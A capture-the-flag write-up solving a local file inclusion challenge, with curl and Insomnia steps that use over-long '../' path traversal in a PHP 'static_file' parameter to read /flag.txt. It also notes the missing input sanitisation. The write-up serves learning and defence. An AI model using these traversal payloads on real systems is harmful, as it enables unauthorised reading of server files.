# WS_1.07 — basic lfi

---

## Problem description

The target application at `basiclfi.challs.cyberchallenge.it` includes a file viewer script `static.php?static_file=<path>` intended for loading static assets. The goal is to read the secret file `/flag.txt` located at the root directory of the server.

---

## Recon

The parameter `static_file` directly hints at a Local File Inclusion (LFI) / Path Traversal vulnerability. If the application appends user input directly to a base directory without input sanitization, `../` sequences allow traversing out of the web root.

An initial attempt using four directory traversal steps:

```bash
curl -s "[http://basiclfi.challs.cyberchallenge.it/static.php?static_file=../../../../flag.txt](http://basiclfi.challs.cyberchallenge.it/static.php?static_file=../../../../flag.txt)"
```

This request returned an empty page / HTTP 404 error instead of the flag. This indicated that the application was hosted deeper within the server's directory structure than 4 directory levels, so the traversal failed to reach `/`.

---

## Analysis

Directory traversal depth depends on the working directory where the application resides (e.g., `/var/www/html/app/assets/`). If the traversal depth is insufficient, the relative path fails to reach the root `/`.

On Linux filesystems, traversing beyond the root directory (e.g., `////` or `../../` at `/`) simply remains at `/` because the root directory is its own parent. Thus, there is no need to calculate the exact depth: supplying an excessive number of `../` sequences guarantees landing at `/` regardless of how deeply nested the web application is.

---

## Exploit, Step by Step

Send a request with an over-traversed path:

```bash
curl -s "[http://basiclfi.challs.cyberchallenge.it/static.php?static_file=../../../../../../../../../../flag.txt](http://basiclfi.challs.cyberchallenge.it/static.php?static_file=../../../../../../../../../../flag.txt)"
```

The server resolves the path to `/flag.txt` and returns the flag in the response body.

---

## Exploitation with Insomnia

1. Create a `GET` request targeting `http://basiclfi.challs.cyberchallenge.it/static.php`.
2. Add a query parameter:
* **Name:** `static_file`
* **Value:** `../../../../../../../../../../flag.txt`


3. Send the request and view the flag directly inside the response panel.

---

## Flag

```
CCIT{****************}
```

---

## What I Learned

* On Linux systems, excessive `../` sequences beyond the root directory are harmless (`/../../` resolves to `/`), so over-traversing is always preferable to guessing exact path depths in LFI vulnerabilities.
* Requesting 4 traversal levels returned a blank/error page because the web root was nested deeper than anticipated; expanding to 10+ levels resolved the path successfully.
* `static.php` lacked basic input sanitization (no `../` stripping, no `basename()` enforcement, and no directory whitelist).